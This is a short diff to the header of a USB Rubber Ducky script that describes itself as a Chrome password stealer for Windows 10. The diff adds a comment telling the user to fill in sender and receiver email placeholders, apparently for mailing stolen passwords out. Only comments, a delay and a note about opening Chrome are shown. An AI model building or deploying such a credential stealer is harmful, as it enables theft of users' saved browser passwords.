@@ -2,6 +2,7 @@ REM Author: Guereak
 REM Ducky chrome password stealer for Windows 10
 REM Modified by Mountain 11/22/21
 REM
+REM Change all instances of SENDEMAIL, SENDEMAIL PASSWORDS, RECEIVEEMAIL
 REM
 DELAY 1000
 REM ----------- opens chrome web browser
